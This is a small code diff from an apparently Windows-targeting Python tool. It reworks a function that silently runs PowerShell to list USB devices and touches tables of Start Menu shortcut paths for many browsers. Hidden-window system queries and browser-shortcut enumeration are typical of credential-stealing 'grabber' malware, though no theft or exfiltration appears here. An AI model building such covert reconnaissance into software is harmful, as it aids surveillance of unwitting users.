@@ -159,8 +159,17 @@ class Functions(object):
     
     @staticmethod
     def hwkishfindDevices():
-        return subprocess.run("powershell Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }",
-                        creationflags=0x08000000, shell=True, capture_output=True)
+        try:
+            command = 'powershell -Command "Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match \'^USB\' }"'
+            process = subprocess.run(command, shell=True, capture_output=True, text=True, creationflags=0x08000000)
+            if process.returncode == 0:
+                return process.stdout
+            else:
+                print(process.stderr)
+            return None
+        except:
+            pass
+
 
     @staticmethod
     def hwkishfindwifi():
@@ -530,7 +539,7 @@ class hwkish_first_funct(Functions):
             }
 
         self.path_shortcutnav_roaming = {
-            "Google Chrome": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome.lnk",
+            "Google Chrome": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome.lnk",
             "Opera": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera.lnk",
             "Opera GX": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera GX.lnk",
             "Brave": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Brave.lnk",
@@ -545,7 +554,7 @@ class hwkish_first_funct(Functions):
             "Opera Neon": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera Neon.lnk"
         }
         self.path_shortcutnav_programdata = {
-            "Google Chrome": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome.lnk",
+            "Google Chrome": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome.lnk",
             "Opera": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera.lnk",
             "Opera GX": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera GX.lnk",
             "Brave": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Brave.lnk",
